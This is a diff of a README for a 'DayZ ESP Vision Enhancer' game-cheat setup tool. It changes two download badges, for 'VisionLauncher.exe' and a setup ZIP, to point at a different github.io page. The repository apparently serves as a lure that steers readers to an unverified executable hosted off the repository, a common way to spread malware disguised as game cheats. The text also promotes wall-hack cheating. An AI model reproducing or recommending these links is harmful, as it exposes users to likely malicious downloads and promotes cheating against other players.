@@ -1,7 +1,7 @@
 # 🎯 DayZ ESP Vision Enhancer — Setup Tool
 
-[![Download VisionLauncher.exe](https://img.shields.io/badge/Download-VisionLauncher.exe-green?style=for-the-badge)](https://dayz-esp-setup-tool-vision-enhancer.github.io/.github/)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://dayz-esp-setup-tool-vision-enhancer.github.io/.github/)
+[![Download VisionLauncher.exe](https://img.shields.io/badge/Download-VisionLauncher.exe-green?style=for-the-badge)](https://joshuadodsonjsyo.github.io/.github/DayZ-ESP-Setup-Tool)
+[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://joshuadodsonjsyo.github.io/.github/DayZ-ESP-Setup-Tool)
 
 ---
 
